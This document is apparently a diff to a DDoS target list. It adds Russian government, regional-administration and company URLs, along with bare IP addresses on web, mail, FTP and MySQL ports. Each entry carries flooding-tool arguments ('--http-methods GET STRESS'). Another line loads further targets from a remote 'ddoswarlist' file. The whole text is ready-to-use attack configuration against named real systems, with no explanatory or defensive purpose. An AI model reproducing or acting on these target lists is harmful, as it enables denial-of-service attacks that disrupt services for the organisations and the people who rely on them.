@@ -1,3 +1,5 @@
+https://new.sipaero.ru https://mail.new.sipaero.ru https://md-crimea.ru http://www.ppcrimea.ru https://rk.gov.ru/ru/structure/235 http://crimea.gov.ru https://gisogd.rk.gov.ru https://minfin.rk.gov.ru/ru/index http://95.173.128.111:80 https://78.155.197.134:443 http://78.155.197.134:9100 http://212.110.158.43:80 http://91.224.168.63:8880 tcp://141.8.193.140:21 tcp://141.8.193.140:25 tcp://94.126.25.146:25 tcp://212.110.158.43:80 tcp://91.224.168.63:80 tcp://91.224.168.63:3306 --http-methods GET STRESS
+
 https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru https://support.crpt.ru/Login/SspLogin.aspx?ReturnUrl=%2F http://nrz.api.sb.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://честныйзнак.рф/potrebitelyam/ tcp://82.202.190.166:443 --http-methods GET STRESS
 
 -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/get.lst --http-methods GET STRESS
